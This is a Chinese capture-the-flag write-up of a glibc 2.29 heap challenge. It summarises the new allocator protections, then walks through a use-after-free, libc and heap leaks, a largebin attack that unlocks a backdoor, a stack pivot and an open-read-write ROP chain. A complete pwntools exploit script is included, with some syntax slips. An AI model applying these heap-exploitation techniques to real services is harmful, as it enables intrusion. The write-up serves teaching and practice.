原创 柠檬汽水 合天智汇

一道神奇的题目,glibc是2.29版本的。这里说下glibc2.29新增的保护

1.tcache加入了key字段，只要free掉tcache就会在tcache块里fd指针后面加一个key字段，每次free的时候都会检查这个块有key字段，那么就会遍历整条链上查找是否有相同的堆块，对比fastbin检查更加严格，所以double
free利用很难了。必须能篡改key字段

2.unsorted bin attack已经成为过去式了，因为在2.29里，会检查unsorted
bin链表的完整性，如果不完整就直接crash，也会检查下一个块的prev size 和prev inuse位，如果不符合就直接crash

3 也会检查top chunk size的合法性，这让house of force成为了过去式

4 off by null利用很难了，因为在进行unlink的时候 2.29会根据prev size找到上一个块，然后检查上一个块的size和prev
size是否相等，不相等就crash，这里导致chunk overlaping很难利用，如果想造成这样那size很难和prev size相等。

接下来看看题,题目开了沙箱，所以只能ORW，题目的洞在delete函数那里，并没有清空指针，所以可以UAF，题目提供了4个功能 1.add 2.delete
3.edit
4.show，同时有一个后门就是输入666，有一个栈溢出，刚好能覆盖返回地址，应该是栈迁移到堆上进行rop,但是后门有个利用条件，就是程序最开始申请的chunk处+0x800的地方要大于0x700000000000，最开始我没有留意后门条件，所以没想到unsorted
bin attack和largebin
attack。这里就应该是利用这两种方式中的一个，向那个地方写入一个比较大的值，从而导致后门成立。那这里要泄露堆地址。同时edit只能用一次，也就是只有一次free后篡改指针的机会。那么结合2.29的新特性，肯定就是largebin
attack了。但是题目申请堆块的大小不是我们控制的，是写死的，只能申请0x10 0xf0 0x300 0x400四种大小的堆块，那如何构造large
bin attack呢

largebin attack是通过篡改largebin
的bk_nextsize和bk来达到申请非预期地址或者向某个地方写入一个比较大的值，这里只讲后面那个。largebin
attack首先要求largebin中有一个比较小的块 ,unsorted
中有一个比他大的块，但是两个块在largebin中的index一定要一样，这时我们申请堆块，unsorted
中的大块会插入到largebin中，从而对原先largebin中的小块进行

具体代码如下

![v2-8ae8a5282e95f9d83a27340afc00f3c5_hd.j](https://pic4.zhimg.com/80/v2-8ae8a5282e95f9d83a27340afc00f3c5_hd.jpg)

victim->bk_nextsize->fd_nextsize = victim;
在这里，victim就是我们largebin中的较小块，篡改他的bk_nextsize指针为target-0x20，然后在将大块插入的时候，就会进行这个操作，从而向target处写上一个堆块地址。那么这道题我们泄露堆地址后向里面错位写上堆块地址，如果不错位的话写入的值只是0x56xxxxxxxxxx，不满足条件，所以要错位写入，就可以达成后门条件，然后就是找到gadget进行ORW
ROP。

既然要ROP，应该先leak libc，这道题leak
libc很简单，就申请八个0x400的chunk，再加一个0x300的chunk(方便后面构造堆块)，然后delete掉这8个，然后show那个进到unsortedbin里的chunk，就leak了libc，然后show
tcache链表中的一个，就可以拿到堆地址了.

接下来我们开始构造largebin
attack，我们首先申请八个0x300的chunk，和一个0x400的chunk，再申请一个0x10防止合并，接着delete掉七个填满tcache，然后释放掉最开始申请的0x300和0x400的chunk，两个就合并成了0x710的chunk，这时候我们申请三个0xf0和一个0x10的chunk，就让现在unsortedbin里的chunk
size域变成了0x400，然后这时候我们free掉0x300的chunk，这时会根据FIFO原则将其插入到unsortedbin开始的部分，然后我们再申请0x300的chunk，他会从unsorted
bin尾部开始遍历，发现0x400的chunk不符合，所以这个0x400被放进largebin，那么就构造好了largebin
attack的条件，这时候我们free掉那个0x400的chunk和刚申请的0x300的chunk，这时利用UAF那一次edit，篡改bk_nextsize指针，同时其他数据不改，并将fd_nextsize置零(因为这个指针如果不置零后面会有unlink操作)，然后这时unsorted
bin中布局 0x310 ->0x410
largebin中布局0x400，这时我们申请0x300的堆块，会跟之前一样将0x410插入largebin，所以就在target处写上了值，开启了后门，同时哦我们在刚申请出来的chunk里布置好rop
chain，接下来就是用后门进行一次栈迁移到堆上，然后ROP，读取flag。

from pwn import *

def add(idx,choice,content): # 1:0x10 2:0xf0 3:0x300 4:0x400

p.recvuntil('Your input: ')

p.sendline('1')

p.recvuntil('Please input the red packet idx: ')

p.sendline(str(idx)) p.recvuntil('How much do you want?(1.0x10 2.0xf0 3.0x300
4.0x400): ')

p.sendline(str(choice)) p.recvuntil('Please input content: ')

p.send(content)

def delete(idx):

p.recvuntil('Your input: ')

p.sendline('2')

p.recvuntil('Please input the red packet idx: ')

p.sendline(str(idx))

def edit(idx,content):

p.recvuntil('Your input: ')

p.sendline('3')

p.recvuntil('Please input the red packet idx: ')

p.sendline(str(idx))

p.recvuntil('Please input content: ')

p.send(content)

def show(idx):

p.recvuntil('Your input: ')

p.sendline('4')

p.recvuntil('Please input the red packet idx: ')

p.sendline(str(idx))

p = process('./hard')

p = remote('[node3.buuoj.cn](http://node3.buuoj.cn/)',25927)

elf = ELF('./hard',checksec = False)

libc = ELF('./libc-2.29.so',checksec = False)

for i in range(7):

add(i,4,str(i)+'\n')

add(8,3,'7\n')

add(7,4,'1\n')

add(9,4,'2\n'

for i in range(8):

delete(i)

show(7)

main_arena = u64(p.recv(6).ljust(8,'\x00'))-0x60

libc_base = main_arena - 0x1e4c40

print '[+] main_arena: '+hex(main_arena)

#print '[+] libc_base: '+hex(libc_base)

#libc_base = main_arena - 0x3ebc40

open = libc_base + libc.symbols['open']

read = libc_base + libc.symbols['read']

write = libc_base + libc.symbols['write']

prdi = libc_base + 0x26542

prsi = libc_base + 0x26f9e

prdx = libc_base + 0x12bda6

prcx = libc_base + 0x10b31e

leave = libc_base + 0x58373

#prdi = libc_base + 0x2155f

#prsi = libc_base + 0x23e6a

#prdx = libc_base + 0x1b96

#prcx = libc_base + 0x3eb0b

#leave = libc_base + 0x54803

print '[+] libc_base: '+hex(libc_base)

print '[+] open: '+hex(open)

print '[+] write: '+hex(write)

add(9,4,'9\n') #7

show(3)heap = u64(p.recv(6).ljust(8,'\x00'))

heap_base = heap - 0x1a90

target = heap_base + 0x260 + 0x802

contain = heap_base + 0x4c70

ropchain =
p64(prdi)+p64(contain+0xa8)+p64(prsi)+p64(0)+p64(prdx)+p64(0)+p64(open)+p64(prdi)+p64(3)+p64(prsi)

ropchain += p64(contain+0x300)+p64(prdx)+p64(0x30)+p64(read)

ropchain +=
p64(prdi)+p64(1)+p64(prsi)+p64(contain+0x300)+p64(prdx)+p64(0x30)+p64(write)

print '[+] target: ' + hex(target)

print '[+] heap_base: ' + hex(heap_base)

for i in range(8):

add(i,3,'1\n')

add(12,4,'12\n')

add(13,4,'13\n')

for i in range(6):

delete(i)

#delete(12)

delete(7)

#add(10,2,'10\n')

delete(8)

delete(9)

for i in range(3):

add(str(i),2,'1\n')

add(1,1,'2\n')

delete(6)

add(6,3,'6\n')

delete(12)

delete(6)

edit(9,p64(0)+p64(0x401)+p64(main_arena+1104)*2+p64(0)+p64(target-0x20))

add(6,3,ropchain+'/flag'.ljust(8,'\x00'))

p.recvuntil('Your input: ')

p.sendline('666')

p.recvuntil('What do you want to say?')

payload = 'a'*0x80+p64(contain-0x8)+p64(leave)

p.send(payload)

#gdb.attach(p)

p.interactive()

那总结一下这道题的手法，首先leak
libc是在更新了tcache之后最常见的，将tcache填满之后，再释放一个大小不在fastbin范围里的chunk，就会进到unsorted
bin。这道题的后门就给了我们提示，需要一个很大的值，那么很容易就联想到largebin
attack写一个很大的值，然后开启后门进行栈迁移，迁移到堆上进行ROP。

Unsorted bin attack在2.29更新后已经成为过去式了，在情况不是那么苛刻的情况下，largebin attack或许可以成为他的替代品。

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

